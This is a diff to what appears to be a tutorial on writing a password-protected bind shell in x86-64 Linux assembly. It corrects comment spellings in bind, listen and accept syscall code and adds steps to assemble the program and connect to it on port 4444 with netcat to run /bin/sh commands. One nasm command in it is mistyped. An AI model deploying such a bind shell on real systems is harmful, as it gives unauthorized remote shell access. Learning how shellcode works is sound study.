@@ -96,7 +96,7 @@ Assembly code:
 ; Bind syscall
 	; The number of 'bind' syscall equals to 49 in decimal
 	; Before assigning anything to rax, save its value to rdi
-	; rdi = fd storred in rax
+	; rdi = fd stored in rax
 	; rsi = sockaddr_in
 	; rdx = length of rsi
 
@@ -154,7 +154,7 @@ int listen(int sockfd, int backlog);
 	push 50 
 	pop rax ; 'listen' syscall number
 
-	; fd is already storred in rdi
+	; fd is already stored in rdi
 
 	push 1
 	pop rsi ; backlog
@@ -187,7 +187,7 @@ int accept (int sockfd, struct sockaddr *addr, socklen_t *addrlen);
 	push rdx
 	push rdx ; the same stack logic as in 'bind' syscall
 
-	mov rsi, rsp ; client will be storred in rsi 
+	mov rsi, rsp ; client will be stored in rsi 
 	push 16 ; size of 'addr'
 	lea rdx, [rsp]
 	syscall
@@ -342,3 +342,18 @@ section .data
 	binsh db "/bin/sh"
 ```
 
+### Run and Test that stuff
+
+I will not dive into explainig what `nasm` or `ld` are. 
+
+- `nasm` - an assembler and disassembler for x86.
+- `ld` - combines a number of object and archive files.
+
+Run those 2 commands:
+1. `nasm -f elf64 -bindshell.o bindshell.s`
+2. `ld -o bindshell bindshell.o`
+
+Now we have our program called 'bindshell'. Run in in your terminal, then open another tab and try to connect to it using netcat command:
+`nc 127.0.0.1 4444`, and right after it input the password you set. Now to check if it works, run some commands like `id` or `whoami` or `echo "dick"`.
+
+I know, some stuff may be frustrating. It gets worse with time, get used to it :3 
